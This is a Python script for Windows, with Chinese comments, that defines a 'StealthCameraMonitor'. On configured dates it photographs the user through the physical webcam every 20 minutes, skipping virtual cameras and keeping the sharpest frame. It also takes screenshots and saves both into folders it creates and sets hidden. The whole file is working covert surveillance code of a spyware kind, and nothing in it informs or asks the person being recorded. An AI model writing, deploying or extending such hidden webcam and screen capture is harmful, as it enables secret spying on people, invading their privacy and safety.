import cv2
import numpy as np
import pyautogui
import os
import sys
import time
import configparser
import logging
from datetime import datetime, date
import win32con
import win32api

# 尝试导入 pygrabber 用于获取摄像头名称
try:
    from pygrabber.dshow_graph import FilterGraph
    HAS_PYGRABBER = True
except ImportError:
    HAS_PYGRABBER = False

# ================= 配置日志记录 =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("monitor_log.txt", encoding='utf-8'),
        logging.StreamHandler() 
    ]
)
logger = logging.getLogger(__name__)

# 默认配置文件模板
DEFAULT_CONFIG = """[TimeRange]
# 格式：月-日，程序只会在 StartDate 到 EndDate 之间运行 (支持跨年)
StartDate = 05-29
EndDate = 05-31

[Storage]
# 照片保存的根目录 (会自动创建并隐藏)
SavePath = D:\\.camera_logs

[Camera]
# 尝试设置的分辨率列表（从高到低：4K, 2K, 1080p, 720p, 480p）
Resolutions = 3840x2160, 2560x1440, 1920x1080, 1280x720, 640x480

[Schedule]
# 每次拍摄成功的间隔时间（秒） 20分钟 = 1200秒
IntervalSeconds = 1200
# 拍摄失败后的重试等待时间（秒） 5分钟 = 300秒
RetrySeconds = 300
"""

# 摄像头名称过滤规则
VIRTUAL_KEYWORDS = ['virtual', 'obs', 'manycam', 'splitcam', 'seewo', 'snap', 'droidcam', 'ndi', 'fake', 'camtwist']
PREFERRED_KEYWORDS = ['usb', 'smart_camera', 'camera', 'webcam', 'video', 'hd', 'fhd']

class StealthCameraMonitor:
    def __init__(self):
        self.config_path = 'config.ini'
        self._ensure_config_exists()
        
        self.config = configparser.ConfigParser()
        self.config.read(self.config_path, encoding='utf-8')

        self.start_date_str = self.config['TimeRange']['StartDate']
        self.end_date_str = self.config['TimeRange']['EndDate']
        self.save_path = self.config['Storage']['SavePath']
        self.interval_seconds = int(self.config['Schedule']['IntervalSeconds'])
        self.retry_seconds = int(self.config['Schedule']['RetrySeconds'])
        
        self.resolution_list = []
        for res in self.config['Camera']['Resolutions'].split(','):
            w, h = map(int, res.strip().split('x'))
            self.resolution_list.append((w, h))

        self.clarity_threshold = 50.0 
        self._setup_directories()

    def _ensure_config_exists(self):
        if not os.path.exists(self.config_path):
            logger.info("未找到 config.ini，正在自动生成默认配置模板...")
            with open(self.config_path, 'w', encoding='utf-8') as f:
                f.write(DEFAULT_CONFIG)

    def _setup_directories(self):
        try:
            if not os.path.exists(self.save_path):
                os.makedirs(self.save_path)
                win32api.SetFileAttributes(self.save_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            
            self.camera_folder = os.path.join(self.save_path, "Camera_Pics")
            self.screenshot_folder = os.path.join(self.save_path, "Screen_Shots")
            
            for folder in [self.camera_folder, self.screenshot_folder]:
                if not os.path.exists(folder):
                    os.makedirs(folder)
                    win32api.SetFileAttributes(folder, win32con.FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            logger.error(f"创建目录失败: {e}")

    def _is_in_date_range(self):
        try:
            today = date.today()
            start_month, start_day = map(int, self.start_date_str.split('-'))
            end_month, end_day = map(int, self.end_date_str.split('-'))
            
            start_date = today.replace(month=start_month, day=start_day)
            end_date = today.replace(month=end_month, day=end_day)
            
            if start_date <= end_date:
                return start_date <= today <= end_date
            else:
                return today >= start_date or today <= end_date
        except Exception as e:
            logger.error(f"日期检查出错: {e}")
            return False

    def _is_virtual_camera(self, name):
        """检查名称是否包含虚拟摄像头关键词"""
        name_lower = name.lower()
        return any(keyword in name_lower for keyword in VIRTUAL_KEYWORDS)

    def _find_physical_camera_index(self):
        """
        多层级检测：
        1. 专门检测：通过设备名称精准匹配物理摄像头（利用 USB 线索）。
        2. 通用检测：如果名称获取失败，遍历索引 0-5 尝试打开。
        """
        logger.info("开始检测可用物理摄像头...")
        
        # === 第一层：专门检测 (基于名称) ===
        if HAS_PYGRABBER:
            try:
                graph = FilterGraph()
                devices = graph.get_input_devices()
                logger.info(f"检测到系统摄像头列表: {devices}")
                
                preferred_indices = []
                normal_indices = []
                
                for idx, name in enumerate(devices):
                    if self._is_virtual_camera(name):
                        logger.info(f"跳过虚拟摄像头: [{idx}] {name}")
                        continue
                    
                    # 如果是物理摄像头，检查是否包含优先关键词 (如 USB)
                    if any(kw in name.lower() for kw in PREFERRED_KEYWORDS):
                        preferred_indices.append(idx)
                    else:
                        normal_indices.append(idx)
                
                # 优先尝试带有 USB/Smart 特征的摄像头
                for idx in preferred_indices + normal_indices:
                    cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
                    if cap.isOpened():
                        logger.info(f"专门检测成功，选中物理摄像头: [{idx}] {devices[idx]}")
                        cap.release()
                        return idx
            except Exception as e:
                logger.warning(f"基于名称的专门检测失败: {e}，将回退到通用检测。")
        else:
            logger.warning("未安装 pygrabber 库，跳过名称检测，直接使用通用检测。")

        # === 第二层：通用检测 (遍历索引回退) ===
        logger.info("执行通用检测：遍历索引 0 到 5...")
        for idx in range(6):
            cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
            if cap.isOpened():
                # 在通用检测中，我们尽量假设 0 可能是虚拟的（很多系统默认0是虚拟），
                # 但如果只有0能打开，也只能用它。这里做个简单的读取测试。
                ret, _ = cap.read()
                cap.release()
                if ret:
                    logger.info(f"通用检测成功，选中可用摄像头索引: {idx}")
                    return idx
                    
        logger.error("未检测到任何可用的摄像头设备。")
        return -1

    def _try_set_resolution(self, cap):
        """尝试从高到低设置分辨率，并验证是否真正生效"""
        for (target_w, target_h) in self.resolution_list:
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, target_w)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, target_h)
            time.sleep(0.3)
            
            # 验证是否真的设置成功了
            actual_w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            actual_h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            
            if actual_w == target_w and actual_h == target_h:
                logger.info(f"成功设置并验证分辨率: {actual_w}x{actual_h}")
                return True
            else:
                logger.debug(f"摄像头不支持 {target_w}x{target_h} (实际输出 {actual_w}x{actual_h})，尝试下一级...")
                
        logger.warning("无法设置高清分辨率，将使用摄像头默认分辨率。")
        return False

    def _try_capture_round(self, cap, count):
        frames = []
        for _ in range(count):
            ret, frame = cap.read()
            if ret and frame is not None:
                frames.append(frame)
            time.sleep(0.3) 
        return frames

    def _evaluate_best(self, frames):
        if not frames:
            return None, 0.0
        best_frame = None
        best_var = -1.0
        for frame in frames:
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            var = cv2.Laplacian(gray, cv2.CV_64F).var()
            if var > best_var:
                best_var = var
                best_frame = frame
        return best_frame, best_var

    def _capture_camera_best(self):
        cam_index = self._find_physical_camera_index()
        if cam_index == -1:
            return None

        cap = None
        all_captured_frames = []

        try:
            # 使用 DirectShow 后端，在 Windows 上兼容性更好
            cap = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                logger.warning(f"无法打开摄像头索引 {cam_index}，可能被其他程序占用。")
                return None

            # 尝试设置最高清晰度
            self._try_set_resolution(cap)

            logger.info("摄像头预热中，等待自动对焦和曝光稳定 (约2.5秒)...")
            # 丢弃前几帧，让摄像头自动曝光和对焦
            for _ in range(5):
                cap.read() 
            time.sleep(2.0)

            # === 第一轮拍摄 (3张) ===
            logger.info("开始第一轮拍摄...")
            frames_round1 = self._try_capture_round(cap, 3)
            all_captured_frames.extend(frames_round1)
            
            best_frame_r1, best_var_r1 = self._evaluate_best(all_captured_frames)
            
            # === 判断是否需要第二轮拍摄 ===
            if best_var_r1 < self.clarity_threshold and best_frame_r1 is not None:
                logger.info(f"第一轮最高清晰度({best_var_r1:.2f})偏低，立马进行第二轮拍摄...")
                time.sleep(1.5) 
                frames_round2 = self._try_capture_round(cap, 3)
                all_captured_frames.extend(frames_round2)

            # === 最终评选 ===
            final_best_frame, final_best_var = self._evaluate_best(all_captured_frames)
            
            if final_best_frame is not None:
                logger.info(f"拍摄完成，从 {len(all_captured_frames)} 张照片中选出最佳，清晰度得分: {final_best_var:.2f}")
                return final_best_frame
            
            return None 

        except Exception as e:
            logger.error(f"摄像头拍摄过程出错: {e}")
            return None
        finally:
            if cap and cap.isOpened():
                cap.release()

    def _capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            if screenshot:
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                return frame
        except Exception as e:
            logger.warning(f"截屏失败 (可能处于锁屏状态): {e}")
        return None

    def _save_image(self, image, folder, prefix="IMG"):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{prefix}_{timestamp}.jpg"
            filepath = os.path.join(folder, filename)
            cv2.imwrite(filepath, image)
            return True
        except Exception as e:
            logger.error(f"保存照片失败: {e}")
            return False

    def run(self):
        logger.info("程序启动，正在检查日期范围...")
        
        if not self._is_in_date_range():
            logger.info("当前日期不在配置的运行范围内，程序自动退出。")
            return

        logger.info(f"进入后台监控模式。成功间隔: {self.interval_seconds//60}分钟, 失败重试: {self.retry_seconds//60}分钟。")

        while True:
            cam_success = False
            screen_success = False
            
            try:
                # 1. 摄像头拍摄
                cam_img = self._capture_camera_best()
                if cam_img is not None:
                    if self._save_image(cam_img, self.camera_folder, "CAM"):
                        cam_success = True
                else:
                    logger.warning("摄像头拍摄彻底失败（被占用或无画面）。")
                    
                # 2. 屏幕截图
                screen_img = self._capture_screenshot()
                if screen_img is not None:
                    if self._save_image(screen_img, self.screenshot_folder, "SCREEN"):
                        screen_success = True
                else:
                    logger.warning("屏幕截图失败。")
                    
                # 3. 决定下一次执行的等待时间
                if cam_success and screen_success:
                    logger.info(f"本次任务全部成功。等待 {self.interval_seconds//60} 分钟后下次执行...")
                    time.sleep(self.interval_seconds)
                else:
                    logger.info(f"本次任务部分或全部失败。等待 {self.retry_seconds//60} 分钟后重试...")
                    time.sleep(self.retry_seconds)

            except KeyboardInterrupt:
                logger.info("程序被中断。")
                break
            except Exception as e:
                logger.error(f"主循环发生未知严重错误: {e}")
                time.sleep(self.retry_seconds)

if __name__ == "__main__":
    monitor = StealthCameraMonitor()
    monitor.run()
